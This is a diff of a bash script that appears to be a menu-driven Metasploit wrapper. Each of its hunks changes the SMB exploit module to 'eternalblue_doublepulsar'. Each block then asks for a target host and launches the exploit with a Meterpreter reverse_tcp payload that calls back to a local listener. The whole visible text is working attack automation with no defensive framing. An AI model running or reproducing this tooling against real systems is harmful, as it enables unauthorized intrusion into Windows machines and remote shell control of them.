@@ -173,7 +173,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
@@ -197,7 +197,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
@@ -221,7 +221,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
@@ -245,7 +245,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
@@ -269,7 +269,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
@@ -293,7 +293,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
@@ -317,7 +317,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
@@ -341,7 +341,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
@@ -365,7 +365,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
@@ -389,7 +389,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    read rhost
 	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
 	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
 	    set LHOST $lhost;
